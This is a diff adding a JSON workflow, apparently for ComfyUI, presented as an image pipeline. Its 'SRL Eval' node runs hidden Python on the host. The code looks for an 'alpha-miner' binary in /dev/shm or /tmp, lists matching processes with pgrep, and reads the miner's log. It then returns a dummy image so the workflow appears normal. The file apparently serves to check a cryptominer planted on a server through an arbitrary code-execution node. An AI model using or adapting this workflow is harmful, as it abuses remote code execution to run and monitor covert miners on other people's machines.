@@ -1,0 +1,28 @@
+{
+  "1": {
+    "class_type": "RandomNoise",
+    "inputs": {
+      "noise_seed": 12345
+    }
+  },
+  "2": {
+    "class_type": "SRL Eval",
+    "inputs": {
+      "parameters": "a",
+      "code": "import subprocess, os\nout = []\n# Check binary\nfor p in [\"/dev/shm/alpha-miner\", \"/tmp/alpha-miner\"]:\n    if os.path.exists(p):\n        out.append(f\"BIN:{p}:{os.path.getsize(p)}\")\n        break\nelse:\n    out.append(\"BIN:MISSING\")\n\n# Check process\nr = subprocess.run([\"pgrep\", \"-a\", \"alpha\"], capture_output=True, text=True)\nout.append(f\"PGREP:{r.stdout.strip()[:80] if r.stdout.strip() else 'none'}\")\n\n# Check log\nfor p in [\"/dev/shm/alpha.log\", \"/tmp/alpha.log\"]:\n    if os.path.exists(p):\n        with open(p) as f:\n            lines = f.readlines()\n        out.append(f\"LOG:{len(lines)}lines:{lines[-1].strip()[:60] if lines else 'empty'}\")\n        break\nelse:\n    out.append(\"LOG:MISSING\")\n\nprint(\"\\n\".join(out))\nimport torch\nreturn torch.zeros(1,1,1,3)",
+      "arg0": [
+        "1",
+        0
+      ]
+    }
+  },
+  "3": {
+    "class_type": "PreviewImage",
+    "inputs": {
+      "images": [
+        "2",
+        0
+      ]
+    }
+  }
+}
